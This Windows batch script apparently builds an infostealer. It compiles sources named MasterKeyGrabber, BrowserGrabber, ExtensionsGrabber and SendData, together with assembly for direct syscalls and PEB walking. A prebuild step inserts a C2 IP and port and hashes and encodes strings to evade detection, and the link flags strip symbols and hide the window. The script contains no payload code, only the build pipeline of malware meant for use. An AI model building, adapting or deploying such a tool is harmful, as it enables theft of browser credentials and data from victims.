@echo off
setlocal

REM SET THE NEEDED VARIABLES
set "CCX64=x86_64-w64-mingw32-gcc"
set "INCLUDE_DIR=-Iinclude"
set "CFLAGS=-Os -fpermissive -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -w -falign-labels=1 -fPIC"
set "LFLAGS=-Wl,--no-seh,--enable-stdcall-fixup -mrdrnd -s -nostdlib -mwindows"
set "CSRC=src/decoding.c src/MasterKeyGrabber.c src/ExtensionsGrabber.c src/SendData.c src/DllOps.c src/FileIO.c src/MemoryUtils.c src/BrowserGrabber.c src/hashing.c src/StringUtils.c src/main.c src/DirectoryOps.c src/globals.c src/AddrResolution.c src/PathOps.c"
set "ASMSRC=src/asm/syscalls.asm src/asm/GetPEB.asm src/asm/NtAllocateCallBack.asm src/asm/LdrLoadDllCallBack.asm"
set "OBJ=main.o decoding.o MasterKeyGrabber.o ExtensionsGrabber.o SendData.o DllOps.o FileIO.o MemoryUtils.o BrowserGrabber.o hashing.o StringUtils.o DirectoryOps.o globals.o AddrResolution.o PathOps.o LdrLoadDllCallBack.o syscalls.o NtAllocateCallBack.o GetPEB.o"
set "TARGET=bin\main.exe"


REM ADDING IP AND PORT AND HASHING FUNCTIONS/SYSCALLS
echo Adding the C2 IP and PORT.
echo Hashing syscalls and functions and encoding strings.
python build-tools/prebuild.py
if %errorlevel% neq 0 (
    exit /b 1
)

REM ASSEMBLE THE ASSEMBLY FILES TO OBJECT FILES
for %%i in (%ASMSRC%) do (
    echo Assembling: %%i
    nasm -f win64 %%i -o %%~ni.o
)

REM COMPILE THE C FILES TO OBJECT FILES
for %%i in (%CSRC%) do (
    echo Compiling C source file: %%i
    %CCX64% %CFLAGS% %INCLUDE_DIR% -c %%i -o %%~ni.o
)

REM LINK EVERYTHING INTO THE FINAL EXECUTABLE
echo Linking object files into executable: %TARGET%
%CCX64% %OBJ% %LFLAGS% -o %TARGET%

REM CLEAN BY DELETING ALL THE OBJECT FILES
echo Cleaning up
del /q %OBJ%
echo The executable is in the bin folder.